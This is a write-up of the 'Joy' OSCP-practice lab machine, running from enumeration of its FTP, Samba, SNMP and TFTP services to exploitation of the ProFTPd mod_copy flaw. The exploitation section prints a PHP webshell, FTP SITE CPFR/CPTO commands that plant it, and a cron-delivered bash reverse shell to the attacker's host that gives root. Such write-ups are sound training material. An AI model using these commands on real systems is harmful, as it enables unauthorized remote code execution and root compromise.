I"EA<p>This is a machine to OSCP preparation, created by <strong>donovan</strong>, this box is full of services and full fun, whose goal is to get root.</p>

<h2 id="information-gathering">Information Gathering</h2>

<h3 id="host-discovery">Host Discovery</h3>
<p>We start by discovering the target with arp-scan, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.133 00:0c:29:65:f3:32       VMware, Inc.
192.168.179.254 00:50:56:e4:71:ef       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Then proceed to perform a port scanning with unicornscan to discover open TCP and UDP ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span>us <span class="nt">-Iv</span> <span class="nt">-mT</span> 192.168.179.133:a <span class="o">&amp;&amp;</span> us <span class="nt">-Iv</span> <span class="nt">-mU</span> 192.168.179.133:a
...
listener statistics 131504 packets recieved 0 packets droped and 0 interface drops
TCP open                     ftp[   21]         from 192.168.179.133  ttl 64
TCP open                     ssh[   22]         from 192.168.179.133  ttl 64
TCP open                    smtp[   25]         from 192.168.179.133  ttl 64
TCP open                    http[   80]         from 192.168.179.133  ttl 64
TCP open                    pop3[  110]         from 192.168.179.133  ttl 64
TCP open             netbios-ssn[  139]         from 192.168.179.133  ttl 64
TCP open                    imap[  143]         from 192.168.179.133  ttl 64
TCP open            microsoft-ds[  445]         from 192.168.179.133  ttl 64
TCP open                     urd[  465]         from 192.168.179.133  ttl 64
TCP open              submission[  587]         from 192.168.179.133  ttl 64
TCP open                   imaps[  993]         from 192.168.179.133  ttl 64
TCP open                   pop3s[  995]         from 192.168.179.133  ttl 64

...
listener statistics 264 packets recieved 0 packets droped and 0 interface drops
UDP open              netbios-ns[  137]         from 192.168.179.133  ttl 64 
UDP open                    snmp[  161]         from 192.168.179.133  ttl 64
.....
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>
<p>After, I perform a TCP scan more complete with nmap to discover the services banner and possible open ports misconfigurations.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p21</span>,22,25,80,110,139,143,445,465,587,993,995 <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-oN</span> nmap-service-enum.txt
...
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 <span class="o">(</span>protocol 2.0<span class="o">)</span>
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>80/tcp  open  http        Apache httpd 2.4.25
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Index of /
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL UIDL STLS CAPA PIPELINING AUTH-RESP-CODE TOP
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: post-login LOGIN-REFERRALS have more IDLE listed SASL-IR STARTTLS OK LITERAL+ capabilities LOGINDISABLEDA0001 ID Pre-login IMAP4rev1 ENABLE
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
465/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>JOY
| Subject Alternative Name: DNS:JOY
| Issuer: <span class="nv">commonName</span><span class="o">=</span>JOY
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-23T14:29:24
| Not valid after:  2028-12-20T14:29:24
| MD5:   9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b
|_SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>587/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>JOY
| Subject Alternative Name: DNS:JOY
| Issuer: <span class="nv">commonName</span><span class="o">=</span>JOY
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-12-23T14:29:24
| Not valid after:  2028-12-20T14:29:24
| MD5:   9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b
|_SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165
993/tcp open  ssl/imaps?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>JOY/organizationName<span class="o">=</span>Good Tech Pte. Ltd/stateOrProvinceName<span class="o">=</span>Singapore/countryName<span class="o">=</span>SG
| Issuer: <span class="nv">commonName</span><span class="o">=</span>JOY/organizationName<span class="o">=</span>Good Tech Pte. Ltd/stateOrProvinceName<span class="o">=</span>Singapore/countryName<span class="o">=</span>SG
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T17:23:23
| Not valid after:  2032-10-05T17:23:23
| MD5:   c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0
|_SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>995/tcp open  ssl/pop3s?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>JOY/organizationName<span class="o">=</span>Good Tech Pte. Ltd/stateOrProvinceName<span class="o">=</span>Singapore/countryName<span class="o">=</span>SG
| Issuer: <span class="nv">commonName</span><span class="o">=</span>JOY/organizationName<span class="o">=</span>Good Tech Pte. Ltd/stateOrProvinceName<span class="o">=</span>Singapore/countryName<span class="o">=</span>SG
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-27T17:23:23
| Not valid after:  2032-10-05T17:23:23
| MD5:   c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0
|_SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
...
</code></pre></div></div>

<h3 id="ftp-enumeration">FTP Enumeration</h3>
<p>We focus on port 21, since the anonymous login is anabled, so we will create a mount of the FTP service to our attacking machine, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span><span class="nb">mkdir</span> /mnt/ftp
root@kali:~/joy<span class="nv">$ </span>curlftpfs ftp://anonymous:@192.168.179.133 /mnt/ftp 
</code></pre></div></div>
<p>Enumerating the upload directory I find the <strong>directory</strong> file, the same one that contains patrickâ€™s home directory resources, a text note and the result of the uname command, the content of this file is updated every period of time, so it is possible that a cron job is behind all this.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span><span class="nb">cat</span> /mnt/ftp/upload/directory         
Patrick<span class="s1">'s Directory                                   
                                                    
total 356
-rw-------  1 patrick patrick   185 Jan 28  2019 .bash_history  
-rw-r--r--  1 patrick patrick   220 Dec 23  2018 .bash_logout    
-rw-r--r--  1 patrick patrick  3526 Dec 23  2018 .bashrc         
...
-rw-r--r--  1 patrick patrick   407 Jan 27  2019 version_control
...
</span></code></pre></div></div>
<p>In the output we can see the <strong>version_control</strong> file, this looks interesting, but not finding a way to exploit it, I proceed to enumerate other services.</p>

<h3 id="samba-enumeration">Samba Enumeration</h3>
<p>Enumerating the samba service, I found the local users patrick and ftp.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/mnt/ftp/upload<span class="nv">$ </span>enum4linux <span class="nt">-a</span> 192.168.179.133
...
<span class="o">[</span>+] Enumerating <span class="nb">users </span>using SID S-1-22-1 and logon username <span class="s1">''</span>, password <span class="s1">''</span>
S-1-22-1-1000 Unix User<span class="se">\p</span>atrick <span class="o">(</span>Local User<span class="o">)</span>
S-1-22-1-1001 Unix User<span class="se">\f</span>tp <span class="o">(</span>Local User<span class="o">)</span> 
</code></pre></div></div>

<h3 id="snmp-enumeration">SNMP Enumeration</h3>
<p>After spend some time trying to enumerate other services, I focused on research the UDP SNMP service and found that the <strong>TFTPd</strong> service is running on port 36969 under patrickâ€™s home directory, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span>nmap <span class="nt">-sU</span> <span class="nt">-v</span> <span class="nt">-p161</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 192.168.179.133
...
|   752: 
|     Name: <span class="k">in</span>.tftpd 
|     Path: /usr/sbin/in.tftpd
|     Params: <span class="nt">--listen</span> <span class="nt">--user</span> tftp <span class="nt">--address</span> 0.0.0.0:36969 <span class="nt">--secure</span> /home/patrick  
...
</code></pre></div></div>

<h3 id="tftpd-enumeration">TFTPD Enumeration</h3>
<p>Then I logged into the TFTPd service and downloaded the <strong>control_version</strong> file, and we see that it contains the versions of the services, and the new path of the webroot directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span>tftp 192.168.179.133 36969
tftp&gt; get version_control
Received 419 bytes <span class="k">in </span>0.0 seconds
tftp&gt; quit

root@kali:~/joy<span class="nv">$ </span><span class="nb">cat </span>version_control 
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations <span class="k">in </span>this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.

</code></pre></div></div>
<p>After investigating for vulnerabilities in the ProFTPd service I found that it is vulnerable to Mod_Copy Command Execution, allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands, you can download the exploit <a href="https://www.exploit-db.com/exploits/49908">here</a>.</p>

<h2 id="exploitation">Exploitation</h2>

<h3 id="proftpd-service">ProFTPd Service</h3>

<p>As I have mounted the FTP resource to our attacking machine, simply I redirect a simple webshell to the FTPâ€™s home directory, and then copy the webshell to the webroot with netcat, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'&lt;?php passthru($_REQUEST["cmd"]); ?&gt;'</span> <span class="o">&gt;</span> /mnt/ftp/z.php
root@kali:~/joy<span class="nv">$ </span>nc 192.168.179.133 21
220 The Good Tech Inc. FTP Server
SITE CPFR /home/ftp/z.php
350 File or directory exists, ready <span class="k">for </span>destination name
SITE CPTO /var/www/tryingharderisjoy/z.php
250 Copy successful
quit
221 Goodbye.
</code></pre></div></div>
<p>I requested the webshell by running the <strong>ls -la</strong> command, and we see that this was written with root permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s1">'http://192.168.179.133/z.php?cmd=ls%20-la'</span>
total 28
drwxr-xr-x 3 www-data www-data 4096 Jul  8 11:31 <span class="nb">.</span>
drwxr-xr-x 3 root     root     4096 Jan 27  2019 ..
drwxr-xr-x 8 www-data www-data 4096 Jan  6  2019 ossec
<span class="nt">-rw-r--r--</span> 1 root     root       37 Jul  8 11:31 z.php
</code></pre></div></div>

<p>Having this in mind we create a cron job with a bash reverse shell that it will execute every minute and then we redirect it to the mounted ftp directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'* * * * * root bash -c "bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"\n'</span> <span class="o">&gt;</span> /mnt/ftp/sysstatus
</code></pre></div></div>
<p>After we transfer it to the <strong>/etc/cron.d/</strong> directory, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span>nc 192.168.179.133 21
220 The Good Tech Inc. FTP Server
SITE CPFR /home/ftp/sysstatus
350 File or directory exists, ready <span class="k">for </span>destination name
SITE CPTO /etc/cron.d/sysstatus
250 Copy successful
quit
221 Goodbye.
</code></pre></div></div>
<p>We set up a netcat listener on port 443 and after a minute we have a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joy<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.133] 50138
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>5051<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@JOY:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@JOY:~# <span class="nb">uname</span> <span class="nt">-a</span>
Linux JOY 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux</span>
root@JOY:~# <span class="nb">cat </span>proof.txt
Never grant <span class="nb">sudo </span>permissions on scripts that perform system functions!
</code></pre></div></div>
:ET